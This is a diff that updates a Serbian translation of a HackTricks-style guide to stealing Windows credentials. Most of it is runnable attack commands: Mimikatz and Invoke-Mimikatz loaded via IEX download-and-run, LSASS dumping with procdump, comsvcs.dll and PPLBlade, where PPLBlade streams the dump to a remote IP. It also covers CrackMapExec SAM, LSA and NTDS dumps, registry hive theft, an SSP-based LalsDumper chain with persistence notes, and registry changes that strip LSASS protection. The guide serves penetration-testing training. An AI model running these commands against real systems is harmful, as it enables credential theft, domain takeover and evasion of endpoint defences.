@@ -1,8 +1,8 @@
-# Krađa Windows Credentials
+# Krađa Windows kredencijala
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Credentials Mimikatz
+## Kredencijali Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Pronađite druge stvari koje Mimikatz može da uradi na** [**this page**](credentials-mimikatz.md)**.**
+**Pronađite druge stvari koje Mimikatz može da radi na** [**ovoj stranici**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -24,11 +24,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke credentials.**
+[**Saznajte više o nekim mogućim zaštitama kredencijala ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izdvoji neke kredencijale.**
 
-## Credentials with Meterpreter
+## Kredencijali sa Meterpreterom
 
-Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da **pretražite passwords i hashes** unutar victim.
+Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da biste **pretražili lozinke i hash-eve** na žrtvinom sistemu.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -45,12 +45,12 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Zaobilaženje AV
+## Zaobilaženje AV-a
 
 ### Procdump + Mimikatz
 
-Pošto je **Procdump from** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitiman Microsoft alat**, ne detektuje ga Defender.\
-Možete koristiti ovaj alat da **dump the lsass process**, **download the dump** i **extract** **credentials locally** iz dump-a.
+Pošto je **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitiman Microsoft alat**, Defender ga ne detektuje.\
+Ovaj alat možete koristiti za **dump lsass procesa**, **preuzimanje dump-a** i **lokalno izdvajanje** **kredencijala** iz dump-a.
 
 Takođe možete koristiti [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
@@ -69,112 +69,112 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-Ovaj proces se automatski izvršava pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Ovaj proces se automatski obavlja pomoću alata [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Note**: Neki **AV** mogu **detektovati** i označiti kao **maliciozno** korišćenje **procdump.exe to dump lsass.exe**, ovo je zato što detektuju string **"procdump.exe" and "lsass.exe"**. Zato je **diskretnije** **proslediti** kao **argument** **PID** procesa lsass.exe procdump-u **umesto** imena **lsass.exe.**
+**Napomena**: Neki **AV** mogu **detektovati** korišćenje alata **procdump.exe za dump lsass.exe** kao **maliciozno**, zato što **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zbog toga je **diskretnije** proslediti **PID** procesa lsass kao **argument** alatu procdump, **umesto** **naziva lsass.exe.**
 
-### Dumping lsass with **comsvcs.dll**
+### Dumping lsass sa **comsvcs.dll**
 
-A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
-Nije bitno šta se koristi u prva dva argumenta, ali treći je podeljen na tri komponente. PID procesa koji treba da bude dump-ovan predstavlja prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta je striktno reč **full**. Nema alternativnih opcija.\
-Nakon parsiranja ovih triju komponenti, DLL kreira dump fajl i prebacuje memoriju navedenog procesa u taj fajl.\
-Korišćenje **comsvcs.dll** je moguće za dump-ovanje procesa lsass, čime se eliminiše potreba za upload-ovanjem i izvršavanjem procdump. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **dump memorije procesa** u slučaju pada sistema. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koja je predviđena za pozivanje pomoću alata `rundll32.exe`.\
+Nije relevantno kako se koriste prva dva argumenta, ali je treći podeljen na tri komponente. PID procesa koji treba dumpovati predstavlja prvu komponentu, lokacija dump fajla predstavlja drugu, dok je treća komponenta isključivo reč **full**. Ne postoje alternativne opcije.\
+Nakon parsiranja ove tri komponente, DLL se koristi za kreiranje dump fajla i prenos memorije navedenog procesa u taj fajl.\
+Korišćenje alata **comsvcs.dll** moguće je za dump lsass procesa, čime se eliminiše potreba za uploadovanjem i izvršavanjem alata procdump. Ovaj metod je detaljno opisan na adresi [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-Sledeća komanda se koristi za izvršenje:
+Za izvršavanje se koristi sledeća komanda:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**Možete automatizovati ovaj proces pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
 ### **Dumping lsass pomoću Task Manager-a**
 
-1. Kliknite desnim tasterom na Task Bar i izaberite Task Manager
+1. Kliknite desnim tasterom na Task Bar i kliknite na Task Manager
 2. Kliknite na More details
-3. Potražite proces "Local Security Authority Process" na kartici Processes
-4. Kliknite desnim tasterom na proces "Local Security Authority Process" i izaberite "Create dump file".
+3. Na kartici Processes pronađite proces „Local Security Authority Process“
+4. Kliknite desnim tasterom na proces „Local Security Authority Process“ i kliknite na „Create dump file“.
 
-### Dumping lsass pomoću procdump
+### Dumping lsass pomoću procdump-a
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je binarni fajl potpisan od strane Microsoft-a koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft-ov binarni fajl sa digitalnim potpisom koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumpin lsass with PPLBlade
+## Dumpovanje lsass procesa pomoću PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za Protected Process Dumper koji podržava obfuskaciju memory dump-a i njihovo prebacivanje na remote workstations bez zapisivanja na disk.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je Tool za dumpovanje Protected Process procesa koji podržava obfuskaciju memory dump-a i njegovo prenošenje na udaljene workstations bez upisivanja na disk.
 
 **Ključne funkcionalnosti**:
 
 1. Zaobilaženje PPL zaštite
-2. Obfuskacija memory dump fajlova kako bi se izbegli Defender mehanizmi detekcije zasnovani na potpisima
-3. Otpremanje memory dump-a koristeći RAW i SMB metode upload-a bez zapisivanja na disk (fileless dump)
+2. Obfuskacija memory dump fajlova radi izbegavanja Defender mehanizama za detekciju zasnovanih na signature-ima
+3. Upload memory dump-a pomoću RAW i SMB upload metoda, bez upisivanja na disk (fileless dump)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
-## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump
+## LalsDumper – SSP-based LSASS dumping bez MiniDumpWriteDump
 
-Ink Dragon isporučuje trostepeni dumper nazvan **LalsDumper** koji nikad ne poziva `MiniDumpWriteDump`, pa EDR hooks na taj API nikad ne aktiviraju:
+Ink Dragon isporučuje dumper u tri faze pod nazivom **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hooks na tom API-ju nikada ne aktiviraju:
 
-1. **Stage 1 loader (`lals.exe`)** – traži `fdp.dll` za placeholder koji se sastoji od 32 mala slova `d`, prepisuje ga apsolutnom putanjom do `rtu.txt`, sačuva ispravljeni DLL kao `nfdp.dll`, i pozove `AddSecurityPackageA("nfdp","fdp")`. To prisiljava **LSASS** da učita zlonamerni DLL kao novi Security Support Provider (SSP).
-2. **Stage 2 inside LSASS** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20`, i mapira dekodovani blob u memoriju pre nego što prebaci izvršenje.
-3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** rešene iz hashed API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedicated export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, streamuje kompresovani LSASS dump u fajl i zatvara handle tako da exfiltration može da se izvrši kasnije.
+1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` u potrazi za placeholder-om koji se sastoji od 32 malih slova `d`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva zakrpenu DLL datoteku kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Time se **LSASS** primorava da učita malicious DLL kao novi Security Support Provider (SSP).
+2. **Stage 2 unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodirani blob u memoriju pre prosleđivanja izvršavanja.
+3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** razrešene iz hash-ovanih API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Poseban export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje kompresovani LSASS dump u datoteku i zatvara handle, tako da exfiltration može da se obavi kasnije.
 
-Operator notes:
+Napomene za operatora:
 
-* Držite `lals.exe`, `fdp.dll`, `nfdp.dll`, i `rtu.txt` u istom direktorijumu. Stage 1 prepisuje hardkodirani placeholder apsolutnom putanjom do `rtu.txt`, tako da njihovo razdvajanje prekida lanac.
-* Registracija se vrši dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Možete sami postaviti tu vrednost da biste naterali LSASS da pri svakom bootu ponovo učita SSP.
-* `%TEMP%\*.ddt` fajlovi su kompresovani dumpovi. Dekomprimiujte lokalno, pa ih prosledite Mimikatz/Volatility za ekstrakciju kredencijala.
-* Pokretanje `lals.exe` zahteva admin/SeTcb prava kako bi `AddSecurityPackageA` uspelo; nakon što poziv vrati kontrolu, LSASS transparentno učitava rogue SSP i izvršava Stage 2.
-* Uklanjanje DLL-a sa diska ga ne izbriše iz LSASS-a. Ili obrišite registry entry i restartujte LSASS (reboot) ili ga ostavite za dugoročnu persistenciju.
+* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 zamenjuje hard-coded placeholder apsolutnom putanjom do `rtu.txt`, pa razdvajanje ovih datoteka prekida chain.
+* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete sami unapred postaviti kako bi LSASS ponovo učitao SSP pri svakom boot-u.
+* `%TEMP%\*.ddt` datoteke su kompresovani dump-ovi. Dekomprimujte ih lokalno, a zatim ih prosledite alatima Mimikatz/Volatility za credential extraction.
+* Pokretanje `lals.exe` zahteva admin/SeTcb prava kako bi `AddSecurityPackageA` uspeo; nakon povratka iz poziva, LSASS transparentno učitava rogue SSP i izvršava Stage 2.
+* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili obrišite registry entry i restartujte LSASS (reboot), ili ga ostavite radi dugoročne persistence.
 
 ## CrackMapExec
 
-### Dump SAM hashes
+### Dump SAM hash-eva
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Dump LSA secrets
+### Dump LSA tajni
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dump the NTDS.dit sa target DC
+### Dump NTDS.dit fajla sa ciljnog DC-a
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Izdvojite istoriju lozinki iz NTDS.dit sa ciljnog DC-a
+### Izvuci istoriju lozinki iz NTDS.dit datoteke sa ciljnog DC-a
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog
+### Prikaži atribut pwdLastSet za svaki nalog iz NTDS.dit datoteke
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Stealing SAM & SYSTEM
+## Krađa SAM & SYSTEM
 
-Ove datoteke bi trebalo da budu **smeštene** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM_. Ali **ne možete ih jednostavno kopirati na uobičajen način** zato što su zaštićene.
+Ovi fajlovi bi trebalo da se nalaze u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićeni.
 
-### Iz registra
+### Iz Registry-ja
 
-Najlakši način da ukradete te datoteke je da dobijete kopiju iz registra:
+Najlakši način da ukradete ove fajlove jeste da preuzmete njihovu kopiju iz Registry-ja:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Download** te datoteke na svoj Kali računar i **extract the hashes** koristeći:
+**Preuzmite** te fajlove na svoju Kali mašinu i **izdvojite hash vrednosti** pomoću:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Volume Shadow Copy
 
-Možete kopirati zaštićene fajlove koristeći ovu uslugu. Potrebno je da budete Administrator.
+Možete kopirati zaštićene datoteke koristeći ovu uslugu. Potrebna su vam Administrator prava.
 
 #### Using vssadmin
 
-vssadmin binary je dostupan samo u verzijama Windows Server.
+vssadmin binary je dostupan samo u Windows Server verzijama
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -187,7 +187,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Ali isto možete uraditi iz **Powershell**. Ovo je primer **kako kopirati SAM file** (korisćen hard disk je "C:" i sačuvano je u C:\users\Public), ali ovo možete koristiti za kopiranje bilo koje zaštićene datoteke:
+Ali isto možete uraditi iz **Powershell-a**. Ovo je primer **kako da kopirate SAM file** (korišćeni hard disk je „C:“, a fajl se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo kog zaštićenog fajla:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -200,86 +200,86 @@ $volume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 ### Invoke-NinjaCopy
 
-Konačno, takođe možete koristiti [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
+Na kraju, možete koristiti i [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju datoteka SAM, SYSTEM i ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
 ## **Active Directory Credentials - NTDS.dit**
 
-Fajl **NTDS.dit** je poznat kao srce **Active Directory**, sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. Tu su sačuvani **password hashes** za domain korisnike. Ovaj fajl je **Extensible Storage Engine (ESE)** baza podataka i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.
+Datoteka **NTDS.dit** poznata je kao srce sistema **Active Directory** i sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. U njoj se čuvaju **password hashes** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na lokaciji **_%SystemRoom%/NTDS/ntds.dit_**.
 
-U ovoj bazi podataka održavaju se tri glavne tabele:
+U ovoj bazi podataka održavaju se tri primarne tabele:
 
-- **Data Table**: Ova tabela čuva informacije o objektima kao što su korisnici i grupe.
+- **Data Table**: Ova tabela čuva detalje o objektima kao što su korisnici i grupe.
 - **Link Table**: Prati odnose, kao što su članstva u grupama.
-- **SD Table**: Ovdje se nalaze **Security descriptors** za svaki objekat, obezbeđujući sigurnost i kontrolu pristupa za sačuvane objekte.
+- **SD Table**: Ovde se čuvaju **security descriptors** za svaki objekat, čime se obezbeđuju sigurnost i kontrola pristupa sačuvanim objektima.
 
-More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows koristi _Ntdsa.dll_ za interakciju sa tim fajlom i on je korišćen od strane _lsass.exe_. Zbog toga, **deo** fajla **NTDS.dit** može se nalaziti **unutar memorije `lsass`** (možete pronaći najnovije pristupane podatke verovatno zbog poboljšanja performansi korišćenjem **cache**).
+Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom, a koristi je _lsass.exe_. Zatim se **deo** datoteke **NTDS.dit** može nalaziti **unutar memorije procesa `lsass`** (verovatno možete pronaći najnovije pristupljene podatke zbog poboljšanja performansi korišćenjem **cache** memorije).
 
-#### Dekriptovanje hash-ova unutar NTDS.dit
+#### Dešifrovanje hash vrednosti unutar NTDS.dit
 
-Hash je šifrovan 3 puta:
+Hash se šifruje 3 puta:
 
-1. Dekriptirajte Password Encryption Key (**PEK**) koristeći **BOOTKEY** i **RC4**.
-2. Dekriptirajte **hash** koristeći **PEK** i **RC4**.
-3. Dekriptirajte **hash** koristeći **DES**.
+1. Dešifrujte Password Encryption Key (**PEK**) pomoću **BOOTKEY** i **RC4**.
+2. Dešifrujte **hash** pomoću **PEK** i **RC4**.
+3. Dešifrujte **hash** pomoću **DES**.
 
-**PEK** ima **istu vrednost** u **svakom domain controller-u**, ali je **šifrovan** unutar fajla **NTDS.dit** koristeći **BOOTKEY** SYSTEM fajla domain controller-a (različit između domain controller-a). Zato, da biste dobili kredencijale iz NTDS.dit fajla **trebate fajlove NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+**PEK** ima **istu vrednost** na svakom **domain controlleru**, ali je **šifrovan** unutar datoteke **NTDS.dit** pomoću **BOOTKEY** vrednosti iz datoteke **SYSTEM** na domain controlleru (**razlikuje se između domain controller-a**). Zbog toga su vam za preuzimanje credentials iz datoteke NTDS.dit potrebne datoteke NTDS.dit i SYSTEM (_C:\Windows\System32\config\SYSTEM_).
 
-### Kopiranje NTDS.dit koristeći Ntdsutil
+### Kopiranje NTDS.dit pomoću Ntdsutil
 
 Dostupno od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Možete takođe koristiti [**volume shadow copy**](#stealing-sam-and-system) trik да копирате **ntds.dit** фајл. Запамтите да ће вам такође требати копија фајла **SYSTEM** (опет, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trik).
+Možete takođe koristiti trik [**volume shadow copy**](#stealing-sam-and-system) za kopiranje datoteke **ntds.dit**. Imajte na umu da će vam takođe biti potrebna kopija datoteke **SYSTEM** (ponovo, koristite trik [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).
 
-### **Izdvajanje hashes iz NTDS.dit**
+### **Izdvajanje hash-eva iz NTDS.dit**
 
-Када сте **дobili** фајлове **NTDS.dit** и **SYSTEM**, можете користити алате као што је _secretsdump.py_ да **izvučete hashes**:
+Kada **pribavite** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ za **izdvajanje hash-eva**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Takođe ih možete **izvući automatski** koristeći validan domain admin user:
+Možete ih takođe **automatski izvući** koristeći validnog domain admin korisnika:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Za **velike NTDS.dit fajlove** preporučuje se njihova ekstrakcija pomoću [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Za **velike NTDS.dit datoteke** preporučuje se njihovo izdvajanje pomoću [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Takođe možete koristiti **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`
+Na kraju, možete koristiti i **Metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`
 
-### **Ekstrakcija objekata domena iz NTDS.dit u SQLite bazu podataka**
+### **Izdvajanje objekata domena iz NTDS.dit u SQLite bazu podataka**
 
-NTDS objekti mogu biti ekstrahovani u SQLite bazu pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Izvlače se ne samo poverljivi podaci, već i kompletni objekti i njihovi atributi za dalju analizu informacija kada je sirovi NTDS.dit fajl već pribavljen.
+NTDS objekti mogu biti izdvojeni u SQLite bazu podataka pomoću alata [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne izdvajaju se samo secrets već i čitavi objekti i njihovi atributi radi daljeg izdvajanja informacija kada je raw NTDS.dit datoteka već preuzeta.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive je opciona, ali omogućava dešifrovanje tajni (NT & LM hashes, supplemental credentials kao što su cleartext passwords, kerberos ili trust keys, NT & LM password histories). Pored ostalih informacija, izvučeni su sledeći podaci : korisnički i mašinski nalozi sa njihovim hash-ovima, UAC flags, vremenska oznaka poslednjeg logona i promene lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, trusted domains sa trusts type, direction i attributes...
+Hive `SYSTEM` je opcioni, ali omogućava dešifrovanje secrets (NT i LM hash-eva, dodatnih kredencijala kao što su cleartext lozinke, Kerberos ili trust ključevi, istorije NT i LM lozinki). Pored drugih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hash-evima, UAC zastavice, vremenske oznake poslednjeg logovanja i promene lozinke, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizational units i članstvo, trusted domains sa tipom trust-a, smerom i atributima...
 
 ## Lazagne
 
-Preuzmite binarni fajl sa [here](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl za ekstrakciju credentials iz više softvera.
+Preuzmite binary sa [ovog mesta](https://github.com/AlessandroZ/LaZagne/releases). Ovaj binary možete koristiti za izdvajanje kredencijala iz različitih software-a.
 ```
 lazagne.exe all
 ```
-## Ostali alati za izvlačenje kredencijala iz SAM i LSASS
+## Drugi alati za izvlačenje kredencijala iz SAM-a i LSASS-a
 
 ### Windows credentials Editor (WCE)
 
-Ovaj alat se može koristiti za izvlačenje kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Ovaj alat može da se koristi za izvlačenje kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Izvlači kredencijale iz SAM fajla
+Izvucite kredencijale iz SAM datoteke
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
 ### PwDump
 
-Izvucite credentials iz SAM fajla
+Izvucite akreditive iz SAM datoteke
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -287,15 +287,15 @@ type outpwdump
 ```
 ### PwDump7
 
-Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **pokrenite ga** i lozinke će biti izvučene.
+Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** da bi lozinke bile izvučene.
 
-## Istraživanje neaktivnih RDP sesija i slabljenje sigurnosnih kontrola
+## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola
 
-Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker čije su tehnike korisne za bilo kog red-teamer-a:
+Ink Dragon-ov FinalDraft RAT uključuje `DumpRDPHistory` tasker čije su tehnike korisne svakom red-teameru:
 
-### DumpRDPHistory-style prikupljanje telemetrije
+### Prikupljanje telemetrije u stilu DumpRDPHistory
 
-* **Outbound RDP targets** – parsirajte svaki user hive na `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podkljuć čuva ime servera, `UsernameHint`, i timestamp poslednjeg zapisa. Možete replicirati FinalDraft-ovu logiku pomoću PowerShell-a:
+* **Odredišta odlaznog RDP-a** – analizirajte svaki korisnički hive na lokaciji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podključ čuva naziv servera, `UsernameHint` i vremensku oznaku poslednje izmene. FinalDraft logiku možete reprodukovati pomoću PowerShell-a:
 
 ```powershell
 Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
@@ -308,7 +308,7 @@ $user = (Get-ItemProperty $_.Name).UsernameHint
 }
 ```
 
-* **Inbound RDP evidence** – pretražite `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log za Event IDs **21** (successful logon) i **25** (disconnect) da mapirate ko je administrirao mašinu:
+* **Dokazi o dolaznom RDP-u** – upitajte log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za Event ID-jeve **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao računar:
 
 ```powershell
 Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
@@ -316,25 +316,25 @@ Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Op
 | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
 ```
 
-Kada saznate koji Domain Admin redovno povezuje, dumpujte LSASS (with LalsDumper/Mimikatz) dok njihova **disconnected** sesija još postoji. CredSSP + NTLM fallback ostavlja njihov verifier i tokene u LSASS, koji se zatim mogu replay-ovati preko SMB/WinRM da biste preuzeli `NTDS.dit` ili postavili persistence na domain controllers.
+Kada utvrdite koji se Domain Admin redovno povezuje, dumpujte LSASS pomoću alata LalsDumper/Mimikatz dok njihova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavljaju njihov verifier i tokene u LSASS-u, koji se zatim mogu replay-ovati preko SMB/WinRM-a radi preuzimanja `NTDS.dit` ili uspostavljanja persistence-a na domain controllerima.
 
-### Registry downgrades targeted by FinalDraft
+### Registry downgrades koje cilja FinalDraft
 
-Isti implant takođe manipuliše nekoliko registry ključeva kako bi olakšao credential theft:
+Isti implant takođe menja nekoliko registry ključeva kako bi krađa credentiala bila jednostavnija:
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 ```
-* Podešavanje `DisableRestrictedAdmin=1` prisiljava full credential/ticket reuse tokom RDP-a, omogućavajući pass-the-hash style pivots.
-* `LocalAccountTokenFilterPolicy=1` onemogućava UAC token filtering, pa lokalni admini dobijaju unrestricted tokens preko mreže.
-* `DSRMAdminLogonBehavior=2` dozvoljava DSRM administratoru prijavu dok je DC online, dajući napadačima još jedan ugrađen high-privilege account.
-* `RunAsPPL=0` uklanja LSASS PPL protections, što čini pristup memoriji trivijalnim za dumpere kao što je LalsDumper.
